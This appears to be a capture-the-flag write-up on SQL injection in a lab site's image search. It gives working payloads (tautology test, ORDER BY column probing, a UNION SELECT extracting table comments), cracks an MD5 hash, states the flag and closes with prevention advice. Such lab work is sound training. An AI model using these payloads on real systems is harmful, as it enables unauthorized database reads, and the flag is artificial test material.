# SQL Injection - Image Search

## Vulnerability
The image search field is vulnerable to SQL injection, same class of vulnerability as the member search.

## Exploitation
1. Navigate to `?page=searchimg`
2. Test: `1 OR 1=1` → returns all images (Nsa, 42 !, Google, Earth, Hack me ?)
3. Confirm 2 columns: `1 ORDER BY 2--` (ok), `1 ORDER BY 3--` (error)
4. Extract data from `list_images`:
   ```
   1 UNION SELECT comment, title FROM list_images--
   ```
   → "Hack me ?" row comment: "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
5. Crack MD5: `1928e8083cf461a51303633093573c46` → `albatroz`
6. Already lowercase: `albatroz`
7. SHA256(`albatroz`) → flag: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Impact
Full database read access, potential for data exfiltration across all tables.

## Prevention
- Use prepared statements / parameterized queries
- Validate and sanitize all user-supplied input
- Apply principle of least privilege on DB user
